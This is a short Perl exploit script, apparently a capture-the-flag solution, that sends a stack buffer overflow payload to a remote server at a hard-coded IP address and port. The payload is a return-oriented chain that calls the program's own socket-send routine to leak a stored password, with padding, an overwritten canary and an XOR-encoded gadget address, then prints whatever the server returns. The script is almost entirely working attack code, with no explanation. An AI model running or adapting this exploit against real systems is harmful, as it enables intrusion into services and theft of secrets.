#!/usr/bin/perl


use strict;
use warnings;
use IO::Socket::INET;

overflow();


sub overflow {
    my $sock = connect_to_serv();
    my $BUFF_SIZE = 0xc0-4;
    my $buff;

    $buff .= pack("L", 0x0804a5ce); # ret
    $buff .= pack("L", 0x0804884b); # sock_send()
    $buff .= pack("L", 0x44444444); # dummy
    $buff .= pack("L", 5);          # sock
    $buff .= pack("L", 0x0805f0c0); # @password
    $buff .= pack("L", 0x100);      # len

    for(1..($BUFF_SIZE - length($buff))) {
        $buff .= "A";
    }

    $buff .= pack("L", 0x0);                     # canary
    $buff .= pack("L", 0x44444444)x3;            # padding

    $buff .= pack("L", 0x080578f5 ^ 0x08056afa); # add esp, 0xc, pop4 ; ret
    $buff .= pack("L", 0x44444444);              # dummy
    $buff .= pack("L", 0xd7 ^ 0x1);              # count

    print $sock $buff;

    print while(<$sock>);
}


sub connect_to_serv {

    return IO::Socket::INET->new(
        #PeerAddr => '127.0.0.1',
        PeerAddr  => '54.152.37.20',
        PeerPort => 24242,
        Proto => 'tcp') || die $@;
}
